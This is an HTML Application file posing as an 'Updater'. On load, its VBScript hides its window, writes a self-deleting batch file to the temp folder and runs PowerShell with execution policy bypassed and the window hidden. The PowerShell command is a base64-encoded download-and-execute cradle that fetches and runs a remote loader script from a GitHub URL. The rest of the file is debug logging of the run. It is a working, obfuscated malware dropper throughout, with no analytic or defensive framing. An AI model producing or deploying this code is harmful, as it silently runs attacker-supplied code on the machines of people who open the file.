<!DOCTYPE html>
<html>
<head>
  <hta:application
    id="Updater"
    applicationname="Updater"
    border="none"
    borderstyle="complex"
    caption="no"
    sysmenu="no"
    scroll="no"
    singleinstance="yes"
    windowstate="minimize"
    showintaskbar="no"
  />
  <title>Updater</title>
  <script language="VBScript">
    Sub Window_OnLoad()
        Dim sh, fso, tempPath, batPath, batContent, encodedCmd, debugPath
        Set sh = CreateObject("WScript.Shell")
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_error_debug.txt")
        tempPath = sh.ExpandEnvironmentStrings("%TEMP%")
        batPath = tempPath & "\run_with_errors.bat"
        encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
        
        ' Create batch file that captures PowerShell errors
        batContent = "@echo off" & vbCrLf & _
                    "echo Starting PowerShell execution > """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "echo Command length: " & Len(encodedCmd) & " >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "echo Full command: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & " >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "echo. >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "echo === ATTEMPTING EXECUTION === >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd & " 2>""" & tempPath & "\ps_errors.txt""" & vbCrLf & _
                    "echo PowerShell exit code: %ERRORLEVEL% >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "echo === TESTING BASIC POWERSHELL === >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Write-Host 'Basic PowerShell works'"" >> """ & tempPath & "\ps_debug.txt""" & " 2>>""" & tempPath & "\ps_errors.txt""" & vbCrLf & _
                    "echo === TESTING DECODED COMMAND === >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedCmd & "'))"" >> """ & tempPath & "\decoded_cmd.txt""" & " 2>>""" & tempPath & "\ps_errors.txt""" & vbCrLf & _
                    "echo === TESTING NETWORK CONNECTIVITY === >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Test-NetConnection -ComputerName google.com -Port 80"" >> """ & tempPath & "\network_test.txt""" & " 2>>""" & tempPath & "\ps_errors.txt""" & vbCrLf & _
                    "echo All tests completed >> """ & tempPath & "\ps_debug.txt""" & vbCrLf & _
                    "timeout /t 10 /nobreak >nul" & vbCrLf & _
                    "del """ & batPath & """"
        
        ' Create and execute batch file
        Set batFile = fso.CreateTextFile(batPath, True)
        batFile.Write batContent
        batFile.Close
        
        ' Log what we're doing
        Dim logFile
        Set logFile = fso.CreateTextFile(debugPath, True)
        logFile.WriteLine "=== ERROR CAPTURE DEBUG ==="
        logFile.WriteLine "Time: " & Now()
        logFile.WriteLine "Created batch file: " & batPath
        logFile.WriteLine "Batch file size: " & fso.GetFile(batPath).Size & " bytes"
        logFile.WriteLine "Executing batch file..."
        logFile.Close
        
        ' Execute batch file
        sh.Run Chr(34) & batPath & Chr(34), 0, False
        
        ' Check results after delay
        setTimeout "CheckAllResults", 12000
    End Sub
    
    Sub CheckAllResults()
        Dim fso, tempPath, debugPath
        Set fso = CreateObject("Scripting.FileSystemObject")
        tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
        debugPath = tempPath & "\hta_error_debug.txt"
        
        Dim logFile
        Set logFile = fso.OpenTextFile(debugPath, 8, True)
        logFile.WriteLine ""
        logFile.WriteLine "=== RESULTS ==="
        logFile.WriteLine "Check time: " & Now()
        
        ' Check PowerShell debug log
        If fso.FileExists(tempPath & "\ps_debug.txt") Then
            logFile.WriteLine "PowerShell debug log found:"
            Dim psDebug
            Set psDebug = fso.OpenTextFile(tempPath & "\ps_debug.txt", 1)
            logFile.WriteLine psDebug.ReadAll()
            psDebug.Close
        Else
            logFile.WriteLine "PowerShell debug log NOT found"
        End If
        
        ' Check PowerShell errors
        If fso.FileExists(tempPath & "\ps_errors.txt") Then
            logFile.WriteLine ""
            logFile.WriteLine "PowerShell errors found:"
            Dim psErrors
            Set psErrors = fso.OpenTextFile(tempPath & "\ps_errors.txt", 1)
            logFile.WriteLine psErrors.ReadAll()
            psErrors.Close
        Else
            logFile.WriteLine "No PowerShell errors file found"
        End If
        
        ' Check decoded command
        If fso.FileExists(tempPath & "\decoded_cmd.txt") Then
            logFile.WriteLine ""
            logFile.WriteLine "Decoded command:"
            Dim decoded
            Set decoded = fso.OpenTextFile(tempPath & "\decoded_cmd.txt", 1)
            logFile.WriteLine decoded.ReadAll()
            decoded.Close
        Else
            logFile.WriteLine "Decoded command file NOT found"
        End If
        
        ' Check network test
        If fso.FileExists(tempPath & "\network_test.txt") Then
            logFile.WriteLine ""
            logFile.WriteLine "Network test results:"
            Dim netTest
            Set netTest = fso.OpenTextFile(tempPath & "\network_test.txt", 1)
            logFile.WriteLine netTest.ReadAll()
            netTest.Close
        Else
            logFile.WriteLine "Network test file NOT found"
        End If
        
        logFile.Close
        setTimeout "CleanupAndExit", 2000
    End Sub
    
    Sub CleanupAndExit()
        self.close
    End Sub
  </script>
</head>
<body>
</body>
</html>
